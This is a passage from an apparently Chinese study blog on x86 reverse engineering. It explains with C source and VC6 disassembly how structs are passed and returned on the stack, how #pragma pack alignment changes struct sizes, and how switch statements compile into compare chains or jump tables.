edi,[ebp-40h]</span><br><span class="line">0040101C   mov         ecx,10h</span><br><span class="line">00401021   mov         eax,0CCCCCCCCh</span><br><span class="line">00401026   rep stos    dword ptr [edi]</span><br><span class="line">9:       d.a = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp+8],1</span><br><span class="line">10:       d.b = 2;</span><br><span class="line">0040102F   mov         word ptr [ebp+0Ch],offset fff+23h (00401033)</span><br><span class="line">11:       d.c = 3;</span><br><span class="line">00401035   mov         byte ptr [ebp+0Eh],3</span><br><span class="line">12:       return d;</span><br><span class="line">00401039   mov         eax,dword ptr [ebp+8]</span><br><span class="line">0040103C   mov         edx,dword ptr [ebp+0Ch]</span><br><span class="line">13:   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ebp</span><br><span class="line">返回值</span><br><span class="line">push ecx</span><br><span class="line">push eax</span><br><span class="line">cccc</span><br><span class="line">ecx a -8</span><br><span class="line">eax bc -4</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>全局变量和这个没啥区别</p><h2 id="函数返回（参数较多）（超过两字节）"><a href="#函数返回（参数较多）（超过两字节）" class="headerlink" title="函数返回（参数较多）（超过两字节）"></a>函数返回（参数较多）（超过两字节）</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AAA</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">AAA <span class="title">fff</span><span class="params">(AAA e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    AAA f;</span><br><span class="line">    <span class="built_in">fff</span>(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; main</span><br><span class="line">1:       AAA f;</span><br><span class="line">2:       fff(f);</span><br><span class="line">0040D708   sub         esp,0Ch</span><br><span class="line">0040D70B   mov         eax,esp</span><br><span class="line">0040D70D   mov         ecx,dword ptr [ebp-0Ch];a</span><br><span class="line">0040D710   mov         dword ptr [eax],ecx</span><br><span class="line">0040D712   mov         edx,dword ptr [ebp-8];bc</span><br><span class="line">0040D715   mov         dword ptr [eax+4],edx</span><br><span class="line">0040D718   mov         ecx,dword ptr [ebp-4];d</span><br><span class="line">0040D71B   mov         dword ptr [eax+8],ecx</span><br><span class="line">0040D71E   lea         edx,[ebp-24h]</span><br><span class="line">0040D721   push        edx</span><br><span class="line">0040D722   call        @ILT+5(fff) (0040100a)</span><br><span class="line">0040D727   add         esp,10h</span><br><span class="line">0040D72A   mov         ecx,dword ptr [eax]</span><br><span class="line">0040D72C   mov         dword ptr [ebp-18h],ecx</span><br><span class="line">0040D72F   mov         edx,dword ptr [eax+4]</span><br><span class="line">0040D732   mov         dword ptr [ebp-14h],edx</span><br><span class="line">0040D735   mov         eax,dword ptr [eax+8]</span><br><span class="line">0040D738   mov         dword ptr [ebp-10h],eax</span><br></pre></td></tr></table></figure><p>建议看着堆栈图来理解。这里没有push而是直接复制进了esp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1:   AAA fff(AAA e)&#123;</span><br><span class="line">00401010   push        ebp</span><br><span class="line">00401011   mov         ebp,esp</span><br><span class="line">00401013   sub         esp,40h</span><br><span class="line">00401016   push        ebx</span><br><span class="line">00401017   push        esi</span><br><span class="line">00401018   push        edi</span><br><span class="line">00401019   lea         edi,[ebp-40h]</span><br><span class="line">0040101C   mov         ecx,10h</span><br><span class="line">00401021   mov         eax,0CCCCCCCCh</span><br><span class="line">00401026   rep stos    dword ptr [edi]</span><br><span class="line">2:       return e;</span><br><span class="line">00401028   mov         eax,dword ptr [ebp+8]</span><br><span class="line">0040102B   mov         ecx,dword ptr [ebp+0Ch]</span><br><span class="line">0040102E   mov         dword ptr [eax],ecx</span><br><span class="line">00401030   mov         edx,dword ptr [ebp+10h]</span><br><span class="line">00401033   mov         dword ptr [eax+4],edx</span><br><span class="line">00401036   mov         ecx,dword ptr [ebp+14h]</span><br><span class="line">00401039   mov         dword ptr [eax+8],ecx</span><br><span class="line">0040103C   mov         eax,dword ptr [ebp+8]</span><br></pre></td></tr></table></figure><p>此时的堆栈是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int3缓冲区</span><br><span class="line">ebp</span><br><span class="line">返回地址</span><br><span class="line">ebp-24h</span><br><span class="line">参数int a</span><br><span class="line">参数short char</span><br><span class="line">参数int d</span><br><span class="line">ccc</span><br><span class="line">-0c a</span><br><span class="line">-8 bc</span><br><span class="line">-4 d</span><br><span class="line">原ebp</span><br><span class="line">+4~20</span><br><span class="line">+24 a</span><br><span class="line">+28 b c</span><br><span class="line">+32(24h) d</span><br></pre></td></tr></table></figure><p>add的10h包括ebp-24h。</p><p>最后通过复制把值取回来。</p><p>全局变量和这个也类似</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><ul><li>结构体和数组的区别：结构体和数组地址都是连续，看等不等宽。等宽多半是数组，不等宽的是结构体。</li><li>他们本质上都是为了存储数据，所以等宽的结构体和数组其实是一个东西</li><li>逆向的本质不是代码还原，只需要知道思想。</li><li>结构体对齐</li></ul><p><code>struct</code></p><p>基值就是全局变量，偏移就是结构体中的一个一个的属性。</p><p><strong>结构特别大的时候，是通过堆栈复制传到函数中的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub esp.18h</span><br><span class="line">mov ecx,6</span><br><span class="line">lea esi,[ebp-18h]</span><br><span class="line">mov edi,esp</span><br><span class="line">rep movsd</span><br></pre></td></tr></table></figure><h2 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h2><p>本质是：选择效率还是选择空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="comment">//结构体</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p><strong>对齐参数：n为字节对齐数，其取值为1、2、4、8，vc6.0默认为8</strong></p><p>n和结构体成员的sizeof值（宽度）作比较，结构体成员的对齐数取两者的最小值。（主要看图吧，说不明白）</p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    __int64 b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p>如果n为1，也就是1字节对齐。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/nyUhvK1sYxErJ69.png" alt="image-20200909111214659.png"></p><p>2字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//14</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/I6dy48pPHFk3fCB.png" alt="image-20200909111400075.png"></p><p>4字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/iXgO7jUQ3Z9rNaW.png" alt="image-20200909111410178.png"></p><p>8字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/t2eMUwdouiyfaPv.png" alt="image-20200909111424322.png"></p><h3 id="对齐原则"><a href="#对齐原则" class="headerlink" title="对齐原则"></a>对齐原则</h3><ul><li>结构体的大小，是结构内部最大字节成员的整数倍，不足会补齐。（例如结构中最大的类型是int类型，结构体的大小就是4字节的整数倍。而不是8的整数倍），和上面的例子其实是一回事，默认参数为8。</li><li>有疑惑建议写代码，可以参考上述的例子</li><li>建议写代码时，由小到大的顺序进行书写，可以节省空间。</li></ul><h1 id="0x10-switch语句（要看编译器）"><a href="#0x10-switch语句（要看编译器）" class="headerlink" title="0x10 switch语句（要看编译器）"></a>0x10 switch语句（要看编译器）</h1><h2 id="情况1：分支少于4"><a href="#情况1：分支少于4" class="headerlink" title="情况1：分支少于4"></a>情况1：分支少于4</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,1</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D728   push        1</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">5:           case 2:</span><br><span class="line">6:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D739   push        3</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">8:           case 3:</span><br><span class="line">9:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D74A   push        3</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">11:           case 4:</span><br><span class="line">12:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D75B   push        4</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p>少于四个分支语句，和if else是没有区别的。</p><h2 id="情况2：分支大于等于四个，有序，值是连续的"><a href="#情况2：分支大于等于四个，有序，值是连续的" class="headerlink" title="情况2：分支大于等于四个，有序，值是连续的"></a>情况2：分支大于等于四个，有序，值是连续的</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,1</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D728   push        1</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">5:           case 2:</span><br><span class="line">6:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D739   push        3</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">8:           case 3:</span><br><span class="line">9:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D74A   push        3</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">11:           case 4:</span><br><span class="line">12:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D75B   push        4</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p><strong>首先把传到switch里的参数减掉最小case值，然后把它和最大case值减最小case值作比较，如果大于则直接跳转default的地址。</strong></p><p>注意不是减一</p><p>否则进入分配好的大表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br></pre></td></tr></table></figure><p>把传入switch的值放进ecx，然后使用ecx*4+地址进行查表。</p><p><img src="https://i.loli.net/2020/09/10/mZnV93JkUYasvqS.png" alt="image-20200910114613580.png"></p><p>这里ecx的值可以为0123分别对应case四个值，通过大表可以进行地址跳转。</p><h2 id="情况3：分支大于等于四个，无序，值是连续的"><a href="#情况3：分支大于等于四个，无序，值是连续的" class="headerlink" title="情况3：分支大于等于四个，无序，值是连续的"></a>情况3：分支大于等于四个，无序，值是连续的</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">6:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,1</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">7:            case 4:</span><br><span class="line">8:                printf(&quot;%d&quot;,4);</span><br><span class="line">0040D728   push        4</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">9:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">10:           case 2:</span><br><span class="line">11:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D739   push        2</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">12:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">13:           case 1:</span><br><span class="line">14:               printf(&quot;%d&quot;,1);</span><br><span class="line">0040D74A   push        1</span><br><span class="line">0040D74C   push        offset string 